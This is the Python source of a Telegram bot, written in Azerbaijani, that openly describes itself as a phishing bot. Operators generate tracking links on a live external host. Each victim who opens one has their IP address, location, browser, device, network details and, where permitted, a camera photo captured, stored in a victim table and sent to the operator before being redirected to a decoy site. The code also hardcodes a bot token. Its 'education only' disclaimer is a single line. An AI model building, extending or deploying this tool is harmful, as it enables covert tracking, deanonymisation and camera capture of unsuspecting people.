import logging
import uuid
import sqlite3
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
import threading
import requests
import json

# Logging konfiqurasiyası
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot token
BOT_TOKEN = "7317862412:AAF_SaKYUI4kTqDamXElz8EQYA5v5EZD7AE"

# Verilənlər bazası yaratmaq
def init_database():
    conn = sqlite3.connect('phishing_data.db')
    cursor = conn.cursor()
    
    # İstifadəçi linkləri cədvəli
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            link_id TEXT UNIQUE,
            target_url TEXT,
            is_active INTEGER DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            clicks INTEGER DEFAULT 0
        )
    ''')
    
    # Qurban məlumatları cədvəli
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victim_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id TEXT,
            ip_address TEXT,
            user_agent TEXT,
            browser_info TEXT,
            os_info TEXT,
            screen_resolution TEXT,
            timezone TEXT,
            language TEXT,
            referrer TEXT,
            location_data TEXT,
            device_info TEXT,
            network_info TEXT,
            camera_image TEXT,
            additional_data TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (link_id) REFERENCES user_links (link_id)
        )
    ''')
    
    conn.commit()
    conn.close()

# Yeni link yaratmaq
async def newlink_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    
    # İstifadəçidən hədəf URL soruşmaq
    await update.message.reply_text(
        "🎯 **Yeni phishing linki yaratmaq üçün:**\n\n"
        "📝 Linkə daxil olan şəxsin yönləndiriləcəyi saytı yazın\n"
        "📋 **Nümunələr:**\n"
        "• `google.com`\n"
        "• `instagram.com`\n"
        "• `https://www.youtube.com/watch?v=dQw4w9WgXcQ`\n"
        "• `facebook.com`\n\n"
        "⚠️ Məlumatlar toplandıqdan sonra bu sayta yönləndiriləcək",
        parse_mode='Markdown'
    )
    
    # İstifadəçinin növbəti mesajını gözləmək üçün state saxlamaq
    context.user_data['waiting_for_target_url'] = True

# Hədəf URL qəbul etmək və link yaratmaq
async def handle_target_url(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    
    # Əgər istifadəçi hədəf URL gözləyirsə
    if context.user_data.get('waiting_for_target_url'):
        target_url = update.message.text.strip()
        
        # URL formatını yoxlamaq və düzəltmək
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
        
        # Verilənlər bazası əlaqəsi
        conn = sqlite3.connect('phishing_data.db')
        cursor = conn.cursor()
        
        try:
            # Əvvəlki aktiv linkləri deaktiv etmək
            cursor.execute('''
                UPDATE user_links SET is_active = 0 
                WHERE user_id = ? AND is_active = 1
            ''', (user_id,))
            
            # Unikal link ID yaratmaq
            link_id = str(uuid.uuid4())[:8]
            
            # Yeni linki aktiv olaraq əlavə etmək (target_url sütunu əlavə edilməlidir)
            cursor.execute('''
                INSERT INTO user_links (user_id, username, link_id, target_url, is_active)
                VALUES (?, ?, ?, ?, 1)
            ''', (user_id, username, link_id, target_url))
            conn.commit()
            
            # Həqiqi server linki yaratmaq
            phishing_link = f"https://j6h5i7cp98j1.manus.space/p/{link_id}"
            
            await update.message.reply_text(
                f"✅ **Phishing linkiniz hazırdır!**\n\n"
                f"`{phishing_link}`\n\n"
                f"🎯 **Hədəf sayt:** `{target_url}`\n"
                f"🆔 **Link ID:** `{link_id}`\n\n"
                f"📋 Linki kopyalamaq üçün üstünə basın\n"
                f"⚠️ Əvvəlki linkləriniz avtomatik deaktiv edildi\n\n"
                f"📊 **Necə işləyir:**\n"
                f"1️⃣ Kimsə linkə daxil olur\n"
                f"2️⃣ Məlumatları toplanır\n"
                f"3️⃣ Avtomatik olaraq `{target_url}` saytına yönləndirilir\n"
                f"4️⃣ Siz məlumatları Telegram-da alırsınız",
                parse_mode='Markdown'
            )
            
            # State-i təmizləmək
            context.user_data['waiting_for_target_url'] = False
            
        except sqlite3.IntegrityError:
            await update.message.reply_text("❌ Xəta baş verdi. Yenidən cəhd edin.")
        except Exception as e:
            await update.message.reply_text(f"❌ Xəta: {str(e)}")
        finally:
            conn.close()
    else:
        # Əgər istifadəçi hədəf URL gözləmirsə, adi mesaj kimi cavab vermək
        await update.message.reply_text(
            "👋 Salam! Yeni phishing linki yaratmaq üçün /newlink əmrini istifadə edin."
        )

# Başlanğıc əmri
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_text = """
🎯 **Phishing Bot-a xoş gəlmisiniz!**

📋 **Əmrlər:**
/newlink - Yeni phishing linki yaratmaq
/help - Kömək məlumatları

⚠️ **Xəbərdarlıq:** Bu bot yalnız təhsil və təhlükəsizlik tədqiqatları üçün nəzərdə tutulub.
"""
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

# Kömək əmri
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = """
🆘 **Kömək Məlumatları:**

🔗 **/newlink** - Yeni phishing linki yaradır
   • Hər yeni link əvvəlkini deaktiv edir
   • Link kopyalamaq üçün üstünə basın
   • Linkə daxil olan hər kəsin məlumatları sizə gələcək

📱 **Toplanan məlumatlar:**
   • IP ünvanı və konum
   • Brauzer və OS məlumatları
   • Ekran həlledilməsi
   • Kamera şəkli (icazə verilsə)
   • Şəbəkə məlumatları
   • Və daha çox...

⚠️ Məsuliyyətlə istifadə edin!
"""
    await update.message.reply_text(help_text, parse_mode='Markdown')

# Qurban məlumatlarını göndərmək
def send_victim_data_to_user(user_id, victim_data):
    """Qurban məlumatlarını Telegram istifadəçisinə göndərmək"""
    try:
        # Bot API vasitəsilə mesaj göndərmək
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        # Məlumatları formatlamaq
        message = f"""
🎯 **Yeni qurban məlumatları!**

🌐 **Əsas məlumatlar:**
📍 IP: `{victim_data.get('ip', 'N/A')}`
🌍 Konum: `{victim_data.get('location', 'N/A')}`
💻 Brauzer: `{victim_data.get('browser', 'N/A')}`
🖥️ OS: `{victim_data.get('os', 'N/A')}`
📱 Cihaz: `{victim_data.get('device', 'N/A')}`

📊 **Texniki məlumatlar:**
🖼️ Ekran: `{victim_data.get('screen', 'N/A')}`
🕐 Vaxt zonası: `{victim_data.get('timezone', 'N/A')}`
🌐 Dil: `{victim_data.get('language', 'N/A')}`
📡 ISP: `{victim_data.get('isp', 'N/A')}`

⏰ Vaxt: `{victim_data.get('timestamp', 'N/A')}`
"""
        
        data = {
            'chat_id': user_id,
            'text': message,
            'parse_mode': 'Markdown'
        }
        
        response = requests.post(url, data=data)
        
        # Əgər kamera şəkli varsa, onu da göndərmək
        if victim_data.get('camera_image'):
            photo_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            photo_data = {
                'chat_id': user_id,
                'caption': '📸 Qurbanın kamera şəkli'
            }
            files = {'photo': victim_data['camera_image']}
            requests.post(photo_url, data=photo_data, files=files)
            
    except Exception as e:
        logger.error(f"Məlumat göndərmə xətası: {e}")

# Bot tətbiqini başlatmaq
def run_bot():
    """Bot-u asinxron olaraq işə salmaq"""
    init_database()
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Əmr işləyicilərini əlavə etmək
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("newlink", newlink_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Mesaj işləyicisini əlavə etmək (hədəf URL üçün)
    from telegram.ext import MessageHandler, filters
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_target_url))
    
    # Bot-u işə salmaq
    logger.info("Telegram bot işə başlayır...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    run_bot()

